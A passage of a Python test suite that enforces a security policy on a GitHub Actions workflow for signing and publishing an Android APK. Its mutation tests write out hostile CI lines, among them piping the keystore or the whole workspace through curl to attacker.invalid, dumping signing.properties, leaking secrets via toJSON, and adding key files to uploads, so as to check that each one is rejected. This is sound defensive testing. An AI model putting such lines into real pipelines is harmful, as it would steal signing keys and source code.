        self.assertEqual(len(action_steps(job, "actions/checkout")), 1)
        self.assertEqual(len(action_steps(job, "actions/setup-java")), 1)
        self.assertEqual(len(action_steps(job, "gradle/actions/setup-gradle")), 1)
        download = action_steps(job, "actions/download-artifact")
        self.assertEqual(len(download), 1)
        self.assertEqual(mapping(download[0], "with", 8).get("name"), "df-lkm-android13-5.15")
        builds = [run_script(step) for step in steps(job) if "./gradlew" in run_script(step)]
        self.assertEqual(len(builds), 1)
        self.assertIn(":app:assembleDebug", builds[0])
        self.assertIn(":app:assembleRelease", builds[0])
        self.assertNotIn("WriteSigningProperties", job)

        job_steps = steps(job)
        counter = named_step(job, APK_COUNTER_COMMAND)
        upload = action_steps(job, "actions/upload-artifact")
        self.assertEqual(len(upload), 1)
        self.assertLess(job_steps.index(counter), job_steps.index(upload[0]))
        self.assertIn("shopt -s nullglob", run_script(counter))
        self.assertIn("${#debug[@]} -ne 1", run_script(counter))
        self.assertIn("${#release[@]} -ne 1", run_script(counter))
        inputs = mapping(upload[0], "with", 8)
        self.assertEqual(inputs.get("path"), CI_UPLOAD_PATH)
        self.assertEqual(inputs.get("if-no-files-found"), "error")
        self.assertEqual(inputs.get("overwrite"), "true")

    def test_release_checks_ancestry_before_referencing_any_signing_secret(self) -> None:
        self.assertIn("# Fail before any signing secret is referenced.", self.raw)
        job = self.jobs["build-release"]
        self.assertEqual(property_value(job, "needs", 4), "build-lkms")
        self.assertEqual(property_value(job, "environment", 4), "release")
        checkout = action_steps(job, "actions/checkout")
        self.assertEqual(len(checkout), 1)
        self.assertEqual(mapping(checkout[0], "with", 8).get("fetch-depth"), "0")
        job_steps = steps(job)
        # Exact equality, not a substring search: an `echo` carrying the
        # ancestry command as text or an `|| true` suffix cannot satisfy this.
        assert_exact_release_run_scripts(self.raw)
        ancestry_step = named_step(job, ANCESTRY_STEP)
        self.assertEqual(run_script(ancestry_step), ANCESTRY_SCRIPT)
        ancestry = job_steps.index(ancestry_step)
        signing = next(index for index, step in enumerate(job_steps) if step_property(step, "name") == "Write signing material")
        self.assertLess(ancestry, signing)
        for index, step in enumerate(job_steps):
            if re.search(r"\bsecrets(?:\.|\[)", step):
                self.assertEqual(index, signing)
        signing_step = job_steps[signing]
        self.assertEqual(run_script(signing_step), "java scripts/WriteSigningProperties.java ci .")
        self.assertEqual(
            mapping(signing_step, "env", 8),
            {name: "${{ secrets." + name + " }}" for name in sorted(SIGNING_SECRETS)},
        )

    def test_release_verifies_one_signed_apk_checksums_and_cleans_up(self) -> None:
        job = self.jobs["build-release"]
        self.assertEqual(len(action_steps(job, "actions/setup-java")), 1)
        self.assertEqual(len(action_steps(job, "gradle/actions/setup-gradle")), 1)
        builds = [run_script(step) for step in steps(job) if "./gradlew" in run_script(step)]
        self.assertEqual(len(builds), 1)
        self.assertIn(":app:assembleRelease", builds[0])
        assert_exact_command_lines(self.raw)
        verify = run_script(named_step(job, "Verify signed release APK"))
        self.assertIn("apks=(app/build/outputs/apk/release/DFRoot_*.apk)", verify)
        self.assertIn("${#apks[@]} -ne 1", verify)
        package = run_script(named_step(job, "Package signed release APK"))
        self.assertIn("cp --", package)
        self.assertIn("release/", package)
        upload = action_steps(job, "actions/upload-artifact")
        self.assertEqual(len(upload), 1)
        inputs = mapping(upload[0], "with", 8)
        self.assertEqual(inputs.get("name"), "DFRoot-release")
        self.assertEqual(inputs.get("path"), RELEASE_UPLOAD_PATH)
        self.assertEqual(inputs.get("retention-days"), "1")
        cleanup = steps(job)[-1]
        self.assertEqual(step_property(cleanup, "if"), "${{ always() }}")
        cleanup_script = run_script(cleanup)
        self.assertIn("rm -f", cleanup_script)
        self.assertIn("signing.properties", cleanup_script)
        self.assertIn("keystore.jks", cleanup_script)

    def test_publisher_only_downloads_verifies_and_publishes(self) -> None:
        job = self.jobs["publish"]
        self.assertEqual(property_value(job, "needs", 4), "build-release")
        self.assertEqual(action_steps(job, "actions/checkout"), [])
        uses = [uses for step in steps(job) if (uses := step_property(step, "uses"))]
        self.assertEqual(
            uses,
            [
                "actions/download-artifact@" + ACTION_PINS["actions/download-artifact"][0],
                "softprops/action-gh-release@" + ACTION_PINS["softprops/action-gh-release"][0],
            ],
        )
        download = action_steps(job, "actions/download-artifact")[0]
        self.assertEqual(mapping(download, "with", 8).get("name"), "DFRoot-release")
        self.assertEqual(mapping(download, "with", 8).get("path"), "dist")
        job_steps = steps(job)
        run_steps = [step for step in job_steps if run_script(step)]
        self.assertEqual(len(run_steps), 1)
        self.assertEqual(step_property(run_steps[0], "name"), "Verify release checksum")
        scripts = run_script(run_steps[0])
        self.assertNotRegex(scripts, r"\b(?:bash|sh|make|gradle|java|python|npm|yarn|cargo|go)\b")
        self.assertNotIn("./gradlew", job)
        self.assertNotRegex(job, r":app:assemble(?:Debug|Release)")
        self.assertNotIn("WriteSigningProperties", job)
        release = action_steps(job, "softprops/action-gh-release")[0]
        self.assertLess(job_steps.index(run_steps[0]), job_steps.index(release))
        inputs = mapping(release, "with", 8)
        self.assertEqual(inputs.get("fail_on_unmatched_files"), "true")
        self.assertEqual(inputs.get("overwrite_files"), "true")
        self.assertEqual(inputs.get("files"), PUBLISH_FILES)

    def test_every_upload_fails_closed_and_overwrites(self) -> None:
        uploads = [step for job in self.jobs.values() for step in action_steps(job, "actions/upload-artifact")]
        self.assertEqual(len(uploads), 3)
        for upload in uploads:
            with self.subTest(artifact=mapping(upload, "with", 8).get("name")):
                inputs = mapping(upload, "with", 8)
                self.assertEqual(inputs.get("if-no-files-found"), "error")
                self.assertEqual(inputs.get("overwrite"), "true")

    def test_gradle_builds_retry_and_jobs_have_timeouts(self) -> None:
        for name, job in self.jobs.items():
            with self.subTest(job=name):
                timeout = property_value(job, "timeout-minutes", 4)
                self.assertIsNotNone(timeout)
                self.assertGreater(int(timeout or 0), 0)
        for name in ("build-dfroot", "build-release"):
            scripts = [run_script(step) for step in steps(self.jobs[name]) if "./gradlew" in run_script(step)]
            self.assertEqual(len(scripts), 1)
            self.assertIn("for attempt in 1 2 3", scripts[0])
            self.assertIn("sleep 30", scripts[0])


class MutationDetectionTests(unittest.TestCase):
    """Every mutation here must be rejected by the hardened policy checks."""

    @classmethod
    def setUpClass(cls) -> None:
        cls.raw = WORKFLOW.read_text(encoding="utf-8")

    def mutate(self, old: str, new: str) -> str:
        self.assertIn(old, self.raw)
        return self.raw.replace(old, new, 1)

    def test_quoted_uses_key_is_rejected(self) -> None:
        mutated = self.mutate("        uses: actions/checkout@", '        "uses": actions/checkout@')
        with self.assertRaises(AssertionError):
            assert_strict_yaml(mutated)
        with self.assertRaisesRegex(AssertionError, "quoted YAML key"):
            assert_strict_yaml(mutated)

    def test_flow_mapping_is_rejected(self) -> None:
        mutated = self.mutate(
            "        with:\n          persist-credentials: false\n",
            "        with: {persist-credentials: false}\n",
        )
        with self.assertRaisesRegex(AssertionError, "flow-style"):
            assert_strict_yaml(mutated)

    def test_flow_sequence_is_rejected(self) -> None:
        mutated = self.mutate("    branches:\n      - master\n      - main\n", "    branches: [master, main]\n")
        with self.assertRaisesRegex(AssertionError, "flow-style"):
            assert_strict_yaml(mutated)

    def test_anchors_aliases_and_merge_keys_are_rejected(self) -> None:
        cases = {
            "anchor": ("          persist-credentials: false", "          persist-credentials: &pc false"),
            "alias": ("          java-version: 21", "          java-version: *pc"),
            "merge key": ("          distribution: temurin", "          <<: *defaults"),
        }
        for label, (old, new) in cases.items():
            with self.subTest(mutation=label):
                with self.assertRaises(AssertionError):
                    assert_strict_yaml(self.mutate(old, new))

    def test_heredoc_noop_in_run_script_is_rejected(self) -> None:
        mutated = self.mutate(
            "          bash tests/signing/run_tests.sh\n",
            "          bash tests/signing/run_tests.sh\n"
            "          cat <<'NOOP' >/dev/null\n"
            "          echo hidden command\n"
            "          NOOP\n",
        )
        with self.assertRaisesRegex(AssertionError, "heredoc in run script"):
            assert_strict_yaml(mutated)

    def test_comment_spoofing_of_test_command_is_detected(self) -> None:
        mutated = self.mutate(
            "          bash tests/signing/run_tests.sh",
            "          # bash tests/signing/run_tests.sh",
        )
        with self.assertRaises(AssertionError):
            assert_exact_test_ci_commands(mutated)

    def test_quote_spoofing_of_test_command_is_detected(self) -> None:
        mutated = self.mutate(
            "          bash tests/signing/run_tests.sh",
            '          "bash tests/signing/run_tests.sh"',
        )
        with self.assertRaises(AssertionError):
            assert_exact_test_ci_commands(mutated)
        with self.assertRaises(AssertionError):
            validate_workflow(mutated)

    def test_secrets_context_bypasses_are_rejected(self) -> None:
        cases = {
            "compact expression": ("KEYSTORE: ${{ secrets.KEYSTORE }}", "KEYSTORE: ${{secrets.KEYSTORE}}"),
            "bare secrets": (
                "          java scripts/WriteSigningProperties.java ci .",
                "          echo secrets >/dev/null\n          java scripts/WriteSigningProperties.java ci .",
            ),
            "toJSON(secrets)": (
                "KEY_ALIAS: ${{ secrets.KEY_ALIAS }}",
                "KEY_ALIAS: ${{ toJSON(secrets) }}",
            ),
            "commented token in run script": (
                "          bash tests/signing/run_tests.sh",
                "          # ${{ secrets.KEYSTORE }}\n          bash tests/signing/run_tests.sh",
            ),
        }
        for label, (old, new) in cases.items():
            with self.subTest(mutation=label):
                with self.assertRaises(AssertionError):
                    assert_no_secrets_bypass(self.mutate(old, new))

    def test_continue_on_error_mutation_is_detected(self) -> None:
        mutated = self.mutate(
            "      - name: Run workflow policy tests\n",
            "      - name: Run workflow policy tests\n        continue-on-error: true\n",
        )
        with self.assertRaises(AssertionError):
            assert_no_continue_on_error(mutated)
        with self.assertRaises(AssertionError):
            assert_required_steps_unskippable(mutated)
        with self.assertRaises(AssertionError):
            validate_workflow(mutated)

    def test_apksigner_noop_mutation_is_detected(self) -> None:
        mutated = self.mutate(
            '          "$apksigner" verify --verbose --print-certs "${apks[0]}"',
            "          true",
        )
        with self.assertRaises(AssertionError):
            assert_exact_command_lines(mutated)
        with self.assertRaises(AssertionError):
            validate_workflow(mutated)

    def test_checksum_noop_mutations_are_detected(self) -> None:
        package = self.mutate('          sha256sum -- "$apk" > "$apk.sha256"', "          true")
        publisher = self.mutate('          sha256sum --check "$checksum"', "          true")
        with self.assertRaises(AssertionError):
            assert_exact_command_lines(package)
        with self.assertRaises(AssertionError):
            assert_exact_command_lines(publisher)

    def test_injected_diagnostic_dump_step_is_rejected(self) -> None:
        mutated = self.mutate(
            "      - name: Clean up signing material\n",
            "      - name: Diagnostic dump\n"
            "        run: |\n"
            "          echo diagnostic\n"
            "      - name: Clean up signing material\n",
        )
        with self.assertRaisesRegex(AssertionError, "step names must be exactly"):
            assert_exact_step_names(mutated)
        with self.assertRaises(AssertionError):
            validate_workflow(mutated)

    def test_signing_file_disclosure_in_release_run_scripts_is_rejected(self) -> None:
        # An injected step AND a modification of an allowlisted step: both must
        # be rejected, and the exemption must apply to cleanup only.
        injected = self.mutate(
            "      - name: Clean up signing material\n",
            "      - name: Diagnostic dump\n"
            "        run: |\n"
            "          cat signing.properties\n"
            "          base64 keystore.jks\n"
            "      - name: Clean up signing material\n",
        )
        modified = self.mutate(
            "      - name: Build signed release APK\n        run: |\n          set -euo pipefail\n",
            "      - name: Build signed release APK\n        run: |\n"
            "          cat signing.properties >/dev/null\n"
            "          base64 keystore.jks >/dev/null\n"
            "          set -euo pipefail\n",
        )
        for label, text in (("injected step", injected), ("modified step", modified)):
            with self.subTest(mutation=label):
                with self.assertRaisesRegex(AssertionError, "must not reference"):
                    assert_release_scripts_do_not_reference_signing_files(text)
                with self.assertRaises(AssertionError):
                    validate_workflow(text)

    def test_appending_signing_files_to_upload_path_is_rejected(self) -> None:
        mutated = self.mutate(
            "            release/DFRoot_*.apk.sha256\n",
            "            release/DFRoot_*.apk.sha256\n"
            "            signing.properties\n"
            "            keystore.jks\n",
        )
        with self.assertRaisesRegex(AssertionError, "must not contain"):
            assert_exact_artifact_inputs(mutated)
        extra = self.mutate(
            "            release/DFRoot_*.apk.sha256\n",
            "            release/DFRoot_*.apk.sha256\n            release/extra.txt\n",
        )
        with self.assertRaisesRegex(AssertionError, "upload path must be exactly"):
            assert_exact_artifact_inputs(extra)
        with self.assertRaises(AssertionError):
            validate_workflow(mutated)
        with self.assertRaises(AssertionError):
            assert_safe_artifact_entries("path", RELEASE_UPLOAD_PATH + "\nsigning.properties")

    def test_appending_signing_files_to_publish_files_is_rejected(self) -> None:
        mutated = self.mutate(
            "            dist/DFRoot_*.apk.sha256\n",
            "            dist/DFRoot_*.apk.sha256\n"
            "            signing.properties\n"
            "            keystore.jks\n",
        )
        with self.assertRaisesRegex(AssertionError, "must not contain"):
            assert_exact_artifact_inputs(mutated)
        extra = self.mutate(
            "            dist/DFRoot_*.apk.sha256\n",
            "            dist/DFRoot_*.apk.sha256\n            dist/extra.txt\n",
        )
        with self.assertRaisesRegex(AssertionError, "publish files must be exactly"):
            assert_exact_artifact_inputs(extra)
        with self.assertRaises(AssertionError):
            validate_workflow(mutated)
        with self.assertRaises(AssertionError):
            assert_safe_artifact_entries("files", PUBLISH_FILES + "\n../keystore.jks")

    def test_ancestry_step_cannot_be_skipped_or_tolerated(self) -> None:
        anchor = "      - name: Verify tag is on master\n"
        cases = {
            "if: false": anchor + "        if: false\n",
            "continue-on-error true expression": anchor + "        continue-on-error: ${{ true }}\n",
        }
        for label, replacement in cases.items():
            with self.subTest(mutation=label):
                mutated = self.mutate(anchor, replacement)
                with self.assertRaisesRegex(AssertionError, "must not be skippable or tolerated"):
                    assert_required_steps_unskippable(mutated)
                with self.assertRaises(AssertionError):
                    validate_workflow(mutated)
        tolerated = self.mutate(anchor, anchor + "        continue-on-error: ${{ true }}\n")
        with self.assertRaisesRegex(AssertionError, "continue-on-error is not allowed"):
            assert_no_continue_on_error(tolerated)

    def test_ancestry_echo_noop_mutation_is_rejected(self) -> None:
        """`echo 'git merge-base ...'` must not satisfy the ancestry guard.

        The guarded variant still contains the exact ancestry command as text,
        so a substring check would pass it; the equality lock must reject it.
        """
        guarded_line = "          if ! git merge-base --is-ancestor HEAD origin/master; then\n"
        whole_guard = (
            "          if ! git merge-base --is-ancestor HEAD origin/master; then\n"
            '            echo "Release tag HEAD must be an ancestor of origin/master" >&2\n'
            "            exit 1\n"
            "          fi\n"
        )
        cases = {
            "guarded echo": (
                guarded_line,
                "          if ! echo 'git merge-base --is-ancestor HEAD origin/master'; then\n",
            ),
            "bare echo replacing guard": (
                whole_guard,
                "          echo 'git merge-base --is-ancestor HEAD origin/master'\n",
            ),
        }
        for label, (old, new) in cases.items():
            with self.subTest(mutation=label):
                mutated = self.mutate(old, new)
                with self.assertRaisesRegex(AssertionError, "run script must be exactly"):
                    assert_exact_release_run_scripts(mutated)
                with self.assertRaises(AssertionError):
                    validate_workflow(mutated)
        guarded_echo = self.mutate(
            guarded_line,
            "          if ! echo 'git merge-base --is-ancestor HEAD origin/master'; then\n",
        )
        ancestry = named_step(
            job_blocks(strip_yaml_comments(guarded_echo))["build-release"], ANCESTRY_STEP
        )
        self.assertIn("git merge-base --is-ancestor HEAD origin/master", run_script(ancestry))

    def test_ancestry_or_true_weakening_is_rejected(self) -> None:
        """Tolerating the ancestry failure with `|| true` must be rejected."""
        guarded_line = "          if ! git merge-base --is-ancestor HEAD origin/master; then\n"
        whole_guard = (
            "          if ! git merge-base --is-ancestor HEAD origin/master; then\n"
            '            echo "Release tag HEAD must be an ancestor of origin/master" >&2\n'
            "            exit 1\n"
            "          fi\n"
        )
        cases = {
            "|| true inside guard": (
                guarded_line,
                "          if ! git merge-base --is-ancestor HEAD origin/master || true; then\n",
            ),
            "guard replaced by tolerated command": (
                whole_guard,
                "          git merge-base --is-ancestor HEAD origin/master || true\n",
            ),
        }
        for label, (old, new) in cases.items():
            with self.subTest(mutation=label):
                mutated = self.mutate(old, new)
                with self.assertRaisesRegex(AssertionError, "run script must be exactly"):
                    assert_exact_release_run_scripts(mutated)
                with self.assertRaises(AssertionError):
                    validate_workflow(mutated)

    def test_cleanup_exfiltration_mutations_are_rejected(self) -> None:
        """Cleanup is not exempt from the exact lock: no appended commands."""
        rm_line = (
            "          rm -f -- signing.properties keystore.jks "
            ".keystore.jks-*.tmp .signing.properties-*.tmp\n"
        )
        cases = {
            "append cat signing.properties": (
                rm_line,
                rm_line + "          cat signing.properties\n",
            ),
            "append base64 | curl exfiltration": (
                rm_line,
                rm_line
                + "          base64 keystore.jks | curl -X POST "
                "--data-binary @- https://attacker.invalid/exfil\n",
            ),
            "append || true": (
                rm_line,
                "          rm -f -- signing.properties keystore.jks "
                ".keystore.jks-*.tmp .signing.properties-*.tmp || true\n",
            ),
        }
        for label, (old, new) in cases.items():
            with self.subTest(mutation=label):
                mutated = self.mutate(old, new)
                # The signing-file reference check deliberately exempts
                # cleanup, so the equality lock is what must catch this.
                with self.assertRaisesRegex(AssertionError, "run script must be exactly"):
                    assert_exact_release_run_scripts(mutated)
                with self.assertRaises(AssertionError):
                    validate_workflow(mutated)

    def test_tar_exfiltration_in_signed_build_step_is_rejected(self) -> None:
        """`tar cf - . | curl ...` appended to the signed build is rejected."""
        build_tail = (
            "            if ./gradlew :app:assembleRelease --no-daemon --console=plain; then\n"
            "              break\n"
            "            fi\n"
            "            if [[ $attempt -eq 3 ]]; then\n"
            '              echo "Gradle build failed after 3 attempts" >&2\n'
            "              exit 1\n"
            "            fi\n"
            '            echo "Gradle build failed (attempt $attempt), retrying in 30s..." >&2\n'
            "            sleep 30\n"
            "          done\n"
        )
        mutated = self.mutate(
            build_tail,
            build_tail
            + "          tar cf - . | curl -X POST "
            "--data-binary @- https://attacker.invalid/exfil\n",
        )
        with self.assertRaisesRegex(AssertionError, "run script must be exactly"):
            assert_exact_release_run_scripts(mutated)
        with self.assertRaises(AssertionError):
            validate_workflow(mutated)

    def test_any_extra_command_in_a_release_run_step_is_rejected(self) -> None:
        """Every one of the six locked run steps rejects an appended command."""
        active = strip_yaml_comments(self.raw)
        job = job_blocks(active)["build-release"]
        for name in RELEASE_RUN_SCRIPTS:
            with self.subTest(step=name):
                step = named_step(job, name)
                mutated = active.replace(
                    step, step.rstrip("\n") + "\n          echo INJECTED\n", 1
                )
                self.assertNotEqual(mutated, active)
                with self.assertRaisesRegex(AssertionError, "run script must be exactly"):
                    assert_exact_release_run_scripts(mutated)
                with self.assertRaises(AssertionError):
                    validate_workflow(mutated)

    def test_continue_on_error_with_any_value_is_rejected(self) -> None:
        for value in ("false", "${{ true }}", "", "'no'"):
            with self.subTest(value=value):
                mutated = self.mutate(
                    "      - name: Run workflow policy tests\n",
                    "      - name: Run workflow policy tests\n"
                    f"        continue-on-error: {value}\n",
                )
                with self.assertRaisesRegex(AssertionError, "continue-on-error is not allowed"):
                    assert_no_continue_on_error(mutated)
                with self.assertRaises(AssertionError):
                    validate_workflow(mutated)

    def test_comment_stripping_is_block_scalar_aware(self) -> None:
        sample = (
            "jobs:\n"
            "  x:\n"
            "    steps:\n"
            "      - name: script with shell quote and shell comment\n"
            "        run: |\n"
            '          echo "unterminated shell quote\n'
            "          # this is shell, not YAML: continue-on-error: true\n"
            "          echo done\n"
            "      - name: next step # yaml comment\n"
            "        uses: actions/checkout@v7 # pinned later\n"
            "        continue-on-error: true\n"
        )
        active = strip_yaml_comments(sample)
        self.assertIn('echo "unterminated shell quote', active)
        self.assertIn("# this is shell, not YAML: continue-on-error: true", active)
        self.assertNotIn("# yaml comment", active)
        self.assertNotIn("# pinned later", active)
        # The shell comment is preserved but is not treated as a YAML key; the
        # real YAML key after the run block is still caught.
        with self.assertRaisesRegex(AssertionError, "continue-on-error"):
            assert_no_continue_on_error(active)
        assert_no_continue_on_error(strip_yaml_comments(sample.replace("        continue-on-error: true\n", "")))


class BehavioralScriptTests(unittest.TestCase):
    """Execute the exact scripts extracted from the workflow against fixtures."""

    @classmethod
    def setUpClass(cls) -> None:
        raw = WORKFLOW.read_text(encoding="utf-8")
        validate_workflow(raw)
        jobs = job_blocks(strip_yaml_comments(raw))
        cls.package_script = run_script(named_step(jobs["build-release"], "Package signed release APK"))
        cls.publisher_script = run_script(named_step(jobs["publish"], "Verify release checksum"))
        cls.verify_script = run_script(named_step(jobs["build-release"], "Verify signed release APK"))
        cls.counter_script = run_script(named_step(jobs["build-dfroot"], APK_COUNTER_COMMAND))

    def test_package_script_requires_exactly_one_release_apk(self) -> None:
        for label, names in (("zero", []), ("multiple", ["DFRoot_a.apk", "DFRoot_b.apk"])):
            with self.subTest(fixture=label), tempfile.TemporaryDirectory() as tmp:
                root = Path(tmp)
                write_release_apks(root, names)
                result = run_in_dir(self.package_script, root)
                self.assertNotEqual(result.returncode, 0, result.stdout + result.stderr)
                self.assertIn("Expected exactly one release APK", result.stderr)

    def test_package_script_writes_matching_checksum_and_replaces_stale_one(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write_release_apks(root, ["DFRoot_one.apk"])
            apk = root / "app/build/outputs/apk/release/DFRoot_one.apk"
            stale = root / "release/DFRoot_one.apk.sha256"
            stale.parent.mkdir(parents=True)
            stale.write_text("STALE CHECKSUM\n", encoding="utf-8")

            result = run_in_dir(self.package_script, root)
            self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
            packaged = root / "release/DFRoot_one.apk"
            self.assertEqual(packaged.read_bytes(), apk.read_bytes())
            expected = hashlib.sha256(apk.read_bytes()).hexdigest() + "  DFRoot_one.apk\n"
            self.assertEqual(stale.read_text(encoding="utf-8"), expected)

    def test_publisher_checksum_script_accepts_one_valid_pair(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write_dist(root, ["DFRoot_ok.apk"])
            result = run_in_dir(self.publisher_script, root)
            self.assertEqual(result.returncode, 0, result.stdout + result.stderr)

    def test_publisher_checksum_script_rejects_zero_multiple_and_mismatch(self) -> None:
        with self.subTest(fixture="zero"), tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "dist").mkdir()
            result = run_in_dir(self.publisher_script, root)
            self.assertNotEqual(result.returncode, 0)
            self.assertIn("Expected exactly one release APK and checksum", result.stderr)

        with self.subTest(fixture="multiple"), tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write_dist(root, ["DFRoot_a.apk", "DFRoot_b.apk"])
            result = run_in_dir(self.publisher_script, root)
            self.assertNotEqual(result.returncode, 0)
            self.assertIn("Expected exactly one release APK and checksum", result.stderr)

        with self.subTest(fixture="filename mismatch"), tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            dist = write_dist(root, ["DFRoot_a.apk"])
            (dist / "DFRoot_a.apk.sha256").rename(dist / "DFRoot_b.apk.sha256")
            result = run_in_dir(self.publisher_script, root)
            self.assertNotEqual(result.returncode, 0)
            self.assertIn("Checksum filename does not match", result.stderr)

        with self.subTest(fixture="digest mismatch"), tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            dist = write_dist(root, ["DFRoot_a.apk"])
            (dist / "DFRoot_a.apk.sha256").write_text(
                "0" * 64 + "  DFRoot_a.apk\n", encoding="utf-8"
            )
            result = run_in_dir(self.publisher_script, root)
            self.assertNotEqual(result.returncode, 0)
            self.assertIn("FAILED", result.stdout + result.stderr)

    def test_verify_script_invokes_real_apksigner_and_propagates_failure(self) -> None:
        for label, exit_code, expected_rc in (("success", 0, 0), ("failure", 1, 1)):
            with self.subTest(fixture=label), tempfile.TemporaryDirectory() as tmp:
                root = Path(tmp)
                write_release_apks(root, ["DFRoot_signed.apk"])
                sdk, log = make_fake_sdk(root, exit_code)
                result = run_in_dir(
                    self.verify_script,
                    root,
                    {"ANDROID_HOME": str(sdk), "APKSIGNER_LOG": str(log)},
                )
                self.assertTrue(log.exists(), "apksigner was never invoked: " + result.stdout + result.stderr)
                self.assertEqual(
                    log.read_text(encoding="utf-8").splitlines(),
                    ["verify", "--verbose", "--print-certs", "app/build/outputs/apk/release/DFRoot_signed.apk"],
                )
                if expected_rc == 0:
                    self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
                else:
                    self.assertNotEqual(result.returncode, 0, result.stdout + result.stderr)

    def test_verify_script_rejects_zero_multiple_and_missing_apksigner(self) -> None:
        with self.subTest(fixture="zero"), tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write_release_apks(root, [])
            sdk, log = make_fake_sdk(root, 0)
            result = run_in_dir(self.verify_script, root, {"ANDROID_HOME": str(sdk), "APKSIGNER_LOG": str(log)})
            self.assertNotEqual(result.returncode, 0)
            self.assertFalse(log.exists())

        with self.subTest(fixture="multiple"), tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write_release_apks(root, ["DFRoot_a.apk", "DFRoot_b.apk"])
            sdk, log = make_fake_sdk(root, 0)
            result = run_in_dir(self.verify_script, root, {"ANDROID_HOME": str(sdk), "APKSIGNER_LOG": str(log)})
            self.assertNotEqual(result.returncode, 0)
            self.assertFalse(log.exists())

        with self.subTest(fixture="missing apksigner"), tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write_release_apks(root, ["DFRoot_a.apk"])
            sdk = root / "sdk"
            sdk.mkdir()
            result = run_in_dir(self.verify_script, root, {"ANDROID_HOME": str(sdk)})
            self.assertNotEqual(result.returncode, 0)
            self.assertIn("apksigner was not found", result.stderr)

    def test_preupload_apk_counter_requires_exactly_one_of_each_variant(self) -> None:
        with self.subTest(fixture="one and one"), tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write_debug_apks(root, ["DFRoot_d.apk"])
            write_release_apks(root, ["DFRoot_r.apk"])
            result = run_in_dir(self.counter_script, root)
            self.assertEqual(result.returncode, 0, result.stdout + result.stderr)

        with self.subTest(fixture="zero debug"), tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write_release_apks(root, ["DFRoot_r.apk"])
            result = run_in_dir(self.counter_script, root)
            self.assertNotEqual(result.returncode, 0)
            self.assertIn("Expected exactly one debug APK and one release APK", result.stderr)

        with self.subTest(fixture="multiple release"), tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write_debug_apks(root, ["DFRoot_d.apk"])
            write_release_apks(root, ["DFRoot_r.apk", "DFRoot_r2.apk"])
            result = run_in_dir(self.counter_script, root)
            self.assertNotEqual(result.returncode, 0)
            self.assertIn("Expected exactly one debug APK and one release APK", result.stderr)


if __name__ == "__main__":
    unittest.main(verbosity=2)
